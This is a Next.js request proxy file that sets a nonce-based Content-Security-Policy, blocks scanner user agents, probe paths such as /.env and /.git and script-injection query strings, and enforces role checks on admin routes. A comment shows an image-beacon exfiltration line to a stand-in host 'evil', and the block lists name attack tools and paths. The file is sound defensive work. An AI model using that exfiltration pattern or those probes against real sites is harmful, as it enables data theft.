import { NextResponse, NextRequest } from "next/server";
import { getToken } from "next-auth/jwt";
import createMiddleware from "next-intl/middleware";
import { routing } from "./i18n/routing";
import { maskIp } from "./lib/security/escape";

// next-intl locale routing (FR at "/", NL/EN prefixed). Applied only to the
// localized site routes below (/api and /admin keep their own handling).
const handleI18nRouting = createMiddleware(routing);

/**
 * Build the CSP for a given per-request nonce.
 *
 * Mirrors the header that used to be a static value in next.config.ts, with
 * one change: script-src now trusts 'nonce-<nonce>' instead of
 * 'unsafe-inline'. style-src is left untouched (still 'unsafe-inline'):
 * Next.js injects inline styles at runtime and nonce-ing those is out of
 * scope here.
 */
function buildCsp(nonce: string): string {
  const baseCsp = [
    "default-src 'self'",
    // Styles: 'unsafe-inline' pour CSS-in-JS + Google Fonts
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
    // Fonts: Google Fonts + Perplexity AI + data URIs
    "font-src 'self' https://fonts.gstatic.com https://r2cdn.perplexity.ai data:",
    // Images: self + data/blob + Google Maps tiles.
    // SECURITY: a blanket `https:` used to be allowed here, which turns any XSS
    // into a working exfiltration channel (`new Image().src =
    // 'https://evil/?'+data` needs no CORS and no user interaction). There is no
    // functional need for it: next.config.ts sets `remotePatterns: []`, so
    // next/image optimises no remote host.
    // www.google.com / www.gstatic.com are needed for the reCAPTCHA badge assets.
    "img-src 'self' data: blob: https://maps.googleapis.com https://maps.gstatic.com https://www.google.com https://www.gstatic.com",
    // Connexions: Vercel Analytics + Speed Insights + reCAPTCHA + Google Maps + Vercel Live
    "connect-src 'self' https://vitals.vercel-insights.com https://vercel-insights.com https://www.google.com https://www.gstatic.com https://maps.googleapis.com https://maps.gstatic.com https://*.googleapis.com https://vercel.live wss://ws-us3.pusher.com https://sockjs-us3.pusher.com",
    // Fermeture sécurité object/frame
    "object-src 'none'",
    // Allow Google Maps + reCAPTCHA + Vercel Live embeds
    "frame-src https://www.google.com https://recaptcha.google.com https://www.recaptcha.net https://maps.googleapis.com https://vercel.live",
    "frame-ancestors 'none'",
    // Base et form
    "base-uri 'self'",
    "form-action 'self'",
    // Upgrade HTTP → HTTPS
    "upgrade-insecure-requests",
  ];

  // script-src: per-request nonce replaces 'unsafe-inline'. 'unsafe-eval'
  // and Vercel Live stay DEV-only (HMR / preview toolbar); both are removed
  // in production.
  const scriptSrc =
    `script-src 'self' 'nonce-${nonce}'` +
    (process.env.NODE_ENV === "production"
      ? ""
      : " 'unsafe-eval' https://vercel.live https://*.vercel.live") +
    " https://va.vercel-scripts.com https://www.google.com https://www.gstatic.com https://maps.googleapis.com https://maps.gstatic.com";
  baseCsp.push(scriptSrc);

  return baseCsp.join("; ");
}

// List of suspicious user agents (common bots, scanners)
const SUSPICIOUS_USER_AGENTS = [
  "sqlmap",
  "nikto",
  "nmap",
  "masscan",
  "nessus",
  "metasploit",
  "burpsuite",
  "acunetix",
  "havij",
  "zgrab",
  "python-requests", // Often used by scrapers
  "scrapy",
  "curl", // Block raw curl in production (uncomment if needed)
];

// List of suspicious paths (common attack patterns)
const SUSPICIOUS_PATHS = [
  "/wp-admin",
  "/phpmyadmin",
  "/.env",
  // "/admin", - Removed, protected by authentication instead
  "/xmlrpc.php",
  "/.git",
  "/config",
  "/backup",
  "/sql",
  "eval(",
  "<script",
  "javascript:",
  "onload=",
  "onerror=",
];

/**
 * Security proxy (formerly `middleware`).
 *
 * Runs on every request to add security headers and block malicious traffic,
 * and handles authentication for admin routes.
 *
 * Next.js 16 deprecated the `middleware` file convention in favour of `proxy`:
 * the file is now src/proxy.ts and the export is `proxy`. Behaviour, the
 * `config.matcher` below and the request/response API are all unchanged — only
 * the two names moved.
 */
export async function proxy(request: NextRequest) {
  const { pathname } = request.nextUrl;
  const userAgent = request.headers.get("user-agent") || "";

  // Per-request CSP nonce. Generated once up front so every response this
  // proxy returns (including the early "blocked" ones below) carries a
  // consistent Content-Security-Policy (next.config.ts no longer sets one).
  const nonce = btoa(crypto.randomUUID());
  const csp = buildCsp(nonce);

  // 1. Block suspicious user agents
  const isSuspiciousAgent = SUSPICIOUS_USER_AGENTS.some((agent) =>
    userAgent.toLowerCase().includes(agent.toLowerCase()),
  );

  if (isSuspiciousAgent) {
    // PRIVACY (GDPR): mask the IP and cap the UA. console.warn survives the
    // production `removeConsole` setting, so a raw IP here is PII written
    // straight into the Vercel logs.
    console.warn("Blocked suspicious user agent:", {
      userAgent: userAgent.substring(0, 100),
      path: pathname,
      ip: maskIp(request.headers.get("x-forwarded-for")),
    });
    const response = new NextResponse("Forbidden", { status: 403 });
    response.headers.set("Content-Security-Policy", csp);
    return response;
  }

  // 2. Block suspicious paths (common attack vectors)
  const isSuspiciousPath = SUSPICIOUS_PATHS.some((pattern) =>
    pathname.toLowerCase().includes(pattern.toLowerCase()),
  );

  if (isSuspiciousPath) {
    console.warn("Blocked suspicious path:", {
      path: pathname,
      ip: maskIp(request.headers.get("x-forwarded-for")),
      userAgent: userAgent.substring(0, 100), // Limit logged UA length
    });
    const response = new NextResponse("Not Found", { status: 404 });
    response.headers.set("Content-Security-Policy", csp);
    return response;
  }

  // 3. Block requests with suspicious query parameters
  const url = request.nextUrl;
  const queryString = url.search.toLowerCase();
  const hasSuspiciousQuery =
    queryString.includes("<script") ||
    queryString.includes("javascript:") ||
    queryString.includes("eval(") ||
    queryString.includes("base64_decode");

  if (hasSuspiciousQuery) {
    console.warn("Blocked suspicious query:", {
      query: queryString.substring(0, 200),
      path: pathname,
      ip: maskIp(request.headers.get("x-forwarded-for")),
    });
    const response = new NextResponse("Bad Request", { status: 400 });
    response.headers.set("Content-Security-Policy", csp);
    return response;
  }

  // 4. Authentication check for admin routes
  if (pathname.startsWith("/admin") && !pathname.startsWith("/admin/login")) {
    const token = await getToken({
      req: request,
      secret: process.env.NEXTAUTH_SECRET,
    });

    if (!token) {
      // Redirect to login page
      const loginUrl = new URL("/admin/login", request.url);
      loginUrl.searchParams.set("callbackUrl", pathname);
      const response = NextResponse.redirect(loginUrl);
      response.headers.set("Content-Security-Policy", csp);
      return response;
    }

    // Check role permissions
    if (pathname.startsWith("/admin/leads")) {
      const userRole = token.role as string;

      // Only admin and sales can access leads
      if (userRole === "viewer") {
        const response = new NextResponse(
          JSON.stringify({ error: "Forbidden: Insufficient permissions" }),
          { status: 403, headers: { "Content-Type": "application/json" } },
        );
        response.headers.set("Content-Security-Policy", csp);
        return response;
      }
    }
  }

  // 5. Authentication check for admin API routes
  if (pathname.startsWith("/api/admin")) {
    // Skip digest endpoint (protected by CRON_SECRET)
    if (pathname === "/api/admin/leads/digest") {
      // Continue to next step
    } else {
      const token = await getToken({
        req: request,
        secret: process.env.NEXTAUTH_SECRET,
      });

      if (!token) {
        const response = new NextResponse(
          JSON.stringify({ error: "Unauthorized: Authentication required" }),
          { status: 401, headers: { "Content-Type": "application/json" } },
        );
        response.headers.set("Content-Security-Policy", csp);
        return response;
      }

      // Check role permissions for admin APIs
      const userRole = token.role as string;

      if (userRole === "viewer") {
        const response = new NextResponse(
          JSON.stringify({ error: "Forbidden: Insufficient permissions" }),
          { status: 403, headers: { "Content-Type": "application/json" } },
        );
        response.headers.set("Content-Security-Policy", csp);
        return response;
      }
    }
  }

  // 6. Add security headers to response
  // Forward the pathname and CSP nonce to Server Components (e.g. the admin
  // layout, or the root layout's inline theme script and JSON-LD blocks) so
  // they can read them via next/headers (usePathname() is client-only, and
  // the nonce simply isn't available any other way to a Server Component).
  const requestHeaders = new Headers(request.headers);
  requestHeaders.set("x-pathname", pathname);
  requestHeaders.set("x-nonce", nonce);

  // /api and /admin are NOT localized: keep the plain header-forwarding
  // response. Everything else is a localized site route → hand off to
  // next-intl for locale detection and prefixing. next-intl's middleware
  // derives its own forwarded request from `request`, so the nonce/pathname
  // headers are set directly on `request.headers` (not just the local copy)
  // to make sure they survive that hand-off too.
  request.headers.set("x-pathname", pathname);
  request.headers.set("x-nonce", nonce);

  const isNonLocalized =
    pathname.startsWith("/api") || pathname.startsWith("/admin");

  const response = isNonLocalized
    ? NextResponse.next({ request: { headers: requestHeaders } })
    : handleI18nRouting(request);

  response.headers.set("x-pathname", pathname);
  response.headers.set("Content-Security-Policy", csp);

  // Add additional security headers not covered by next.config.ts
  response.headers.set("X-Request-ID", crypto.randomUUID());

  // Remove server information leakage
  response.headers.delete("X-Powered-By");

  return response;
}

// Configure which routes the proxy runs on
export const config = {
  matcher: [
    /*
     * Match all request paths except:
     * - _next/static (static files)
     * - _next/image (image optimization files)
     * - favicon.ico (favicon file)
     * - public folder
     */
    "/((?!_next/static|_next/image|favicon.ico|manifest\\.json|robots\\.txt|sitemap\\.xml|.*\\.(?:svg|png|jpg|jpeg|gif|webp|ico|woff|woff2)$).*)",
  ],
};
